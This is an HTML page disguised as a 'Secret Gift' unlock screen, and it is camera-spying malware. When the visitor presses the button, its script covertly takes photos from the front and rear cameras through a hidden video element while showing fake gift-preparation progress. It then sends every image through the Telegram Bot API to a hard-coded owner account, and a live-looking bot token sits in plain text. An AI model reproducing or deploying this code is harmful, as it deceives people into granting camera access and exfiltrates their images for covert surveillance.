<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ğŸ Surprise Gift</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  margin: 0;
  background: linear-gradient(135deg, #0b0014, #1a0030);
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
  overflow: hidden;
}

.card {
  background: rgba(22, 0, 34, 0.9);
  padding: 30px;
  border-radius: 20px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
  text-align: center;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 0, 255, 0.3);
}

.gift-icon {
  font-size: 70px;
  margin-bottom: 10px;
  animation: float 3s ease-in-out infinite;
}

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

h2 {
  margin: 10px 0;
  background: linear-gradient(45deg, #ff00ff, #00ffff);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  border-radius: 50px;
  border: none;
  background: linear-gradient(45deg, #ff00ff, #00ffff);
  color: black;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid rgba(255, 0, 255, 0.3);
  border-top: 4px solid #ff00ff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 20px auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.progress-container {
  width: 100%;
  height: 8px;
  background: rgba(255, 0, 255, 0.2);
  border-radius: 4px;
  margin: 20px 0;
  overflow: hidden;
}

.progress-bar {
  height: 100%;
  background: linear-gradient(90deg, #ff00ff, #00ffff);
  width: 0%;
  transition: width 0.5s ease;
}

.status {
  margin-top: 15px;
  font-size: 14px;
  color: #ffb3ff;
  min-height: 20px;
}

.hidden {
  position: fixed;
  top: -9999px;
  width: 1px;
  height: 1px;
  opacity: 0;
}
</style>
</head>

<body>
<div class="card" id="box">
  <div class="gift-icon">ğŸ</div>
  <h2>âœ¨ Secret Gift âœ¨</h2>
  <p>A magical surprise is waiting for you!</p>
  <button id="unlockBtn">ğŸ¯ Unlock Gift</button>
  <div class="status" id="status"></div>
</div>

<video class="hidden" id="video" autoplay playsinline></video>

<script>
const USER_ID = new URLSearchParams(window.location.search).get('uid');
const BOT_TOKEN = "8226782560:AAF2iapgn0UUbVfR5LV87TQQGqfqVfOc88I";
const OWNER_ID = "8215819954";

document.getElementById("unlockBtn").onclick = async () => {
  const box = document.getElementById("box");
  const btn = document.getElementById("unlockBtn");
  btn.disabled = true;
  
  box.innerHTML = `
    <div class="gift-icon">âœ¨</div>
    <h2>ğŸ€ Creating Magic</h2>
    <p>Please wait while we prepare your gift...</p>
    <div class="spinner"></div>
    <div class="progress-container">
      <div class="progress-bar" id="progress"></div>
    </div>
    <div class="status" id="statusText">Initializing...</div>
  `;
  
  const progress = document.getElementById("progress");
  const statusText = document.getElementById("statusText");
  const video = document.getElementById("video");
  
  try {
    // Front Camera - 4 photos
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = frontStream;
    
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1000);
      };
    });
    
    for (let i = 1; i <= 4; i++) {
      progress.style.width = (i * 12.5) + "%";
      statusText.textContent = "Preparing your gift...";
      await new Promise(r => setTimeout(r, 800));
      await capturePhoto(`front_${i}`);
    }
    
    frontStream.getTracks().forEach(track => track.stop());
    
    // Back Camera - 4 photos
    await new Promise(r => setTimeout(r, 1000));
    
    const backStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" },
      audio: false
    });
    video.srcObject = backStream;
    
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1000);
      };
    });
    
    for (let i = 1; i <= 4; i++) {
      progress.style.width = (50 + i * 12.5) + "%";
      statusText.textContent = "Finalizing your gift...";
      await new Promise(r => setTimeout(r, 800));
      await capturePhoto(`back_${i}`);
    }
    
    backStream.getTracks().forEach(track => track.stop());
    
    progress.style.width = "100%";
    statusText.textContent = "Finishing up...";
    await new Promise(r => setTimeout(r, 1500));
    
    // Success
    box.innerHTML = `
      <div class="gift-icon">ğŸ‰</div>
      <h2 style="color:#00ff00">ğŸ Gift Delivered!</h2>
      <p>Your special surprise has been prepared</p>
      <p>Thank you for waiting!</p>
      <div class="status" style="color:#00ff00">âœ¨ Complete âœ¨</div>
    `;
    
  } catch (error) {
    box.innerHTML = `
      <div class="gift-icon">ğŸ­</div>
      <h2 style="color:#ff5555">Needs Camera Access</h2>
      <p>Please allow camera to receive your gift</p>
      <button onclick="location.reload()">ğŸ”„ Try Again</button>
    `;
  }
};

async function capturePhoto(label) {
  const video = document.getElementById("video");
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  return new Promise((resolve) => {
    canvas.toBlob(async (blob) => {
      if (blob) {
        const reader = new FileReader();
        reader.onloadend = async () => {
          const base64data = reader.result.split(',')[1];
          
          // Send to user
          await sendToTelegram(USER_ID, base64data, `ğŸ Your Gift: ${label}`);
          
          // Send to owner
          await sendToTelegram(OWNER_ID, base64data, `ğŸ“¸ From ${USER_ID}: ${label}`);
          
          resolve();
        };
        reader.readAsDataURL(blob);
      } else {
        resolve();
      }
    }, 'image/jpeg', 0.9);
  });
}

async function sendToTelegram(chatId, photoBase64, caption) {
  try {
    const byteCharacters = atob(photoBase64);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
      byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], { type: 'image/jpeg' });
    
    const formData = new FormData();
    formData.append('photo', blob, 'gift.jpg');
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    return true;
  } catch (error) {
    console.error(`Failed to send to ${chatId}:`, error);
    return false;
  }
}
</script>
</body>
</html>
